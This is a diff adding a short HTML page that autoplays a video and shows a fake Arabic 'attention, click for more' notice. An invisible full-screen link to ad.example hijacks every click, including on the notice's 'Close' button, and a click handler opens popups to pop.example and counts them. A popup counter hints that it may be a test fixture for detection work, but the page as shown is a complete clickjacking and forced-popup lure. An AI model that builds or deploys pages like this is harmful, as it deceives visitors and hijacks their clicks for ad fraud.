@@ -1,0 +1,8 @@
+<html><head><meta charset="utf-8"><title>p</title></head><body style="margin:0;background:#000">
+<video id="v" style="width:100%" muted></video>
+<div id="lure" style="position:absolute;top:20px;left:20px;width:300px;background:#fff;padding:10px"><b>انتباه</b><p>انقر للمزيد للمتابعة</p><button>أكثر</button><button>إغلاق</button></div>
+<a id="hj" href="https://ad.example" style="position:fixed;inset:0;opacity:0;z-index:99999"></a>
+<script>
+fetch('v.mp4').then(r=>r.blob()).then(b=>{var v=document.getElementById('v');v.src=URL.createObjectURL(b);v.play()});
+window.__opened=0; document.addEventListener('click',function(){var w=window.open('https://pop.example');if(w)window.__opened++});
+</script></body></html>
